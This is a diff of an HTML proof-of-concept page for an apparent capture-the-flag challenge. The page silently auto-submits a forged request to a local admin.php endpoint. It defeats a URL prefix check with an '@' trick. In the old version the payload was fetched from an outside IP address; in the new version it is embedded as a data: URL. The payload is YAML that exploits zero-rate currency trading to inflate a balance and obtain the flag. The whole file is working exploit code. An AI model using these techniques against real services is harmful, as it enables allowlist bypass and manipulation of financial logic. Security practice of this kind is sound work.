@@ -1,12 +1,34 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>ctf poc</title>
-<form method="post" action="http://localhost:5000/admin.php">
-  <!-- Prefix passes starts_with('http://localhost:5000/admin.php');
-       parser fetches YAML from the HTTP URL after '@' -->
-  <input type="hidden" name="url"
-         value="http://localhost:5000/admin.php@http://75.119.143.38:8001/y.yaml">
+
+<form id="f" method="post" action="http://localhost:5000/admin.php">
+  <input type="hidden" name="url" id="u">
 </form>
+
 <script>
-  document.forms[0].submit();
+/*
+  Goal:
+    1) BUY 1,000,000 ZZZ  (unknown -> rate 0, cost 0)
+    2) SELL 1,000,000 ZZZ (credits 'amount' since value==0; balance becomes 1,000,001)
+    3) BUY 1 FL           (rate 1,000,000; succeeds; admin prints flag for FL)
+*/
+const yaml =
+  '- amount: 1000000\n' +
+  '  currency: ZZZ\n' +
+  '  op: BUY\n' +
+  '- amount: 1000000\n' +
+  '  currency: ZZZ\n' +
+  '  op: SELL\n' +
+  '- amount: 1\n' +
+  '  currency: FL\n' +
+  '  op: BUY';
+
+// Prefix passes startsWith("http://localhost:5000/admin.php")
+// The content actually comes from the data: payload after '@'
+const url = 'http://localhost:5000/admin.php@data:text/plain,' + encodeURIComponent(yaml);
+
+// Fill and submit
+document.getElementById('u').value = url;
+document.getElementById('f').submit();
 </script>
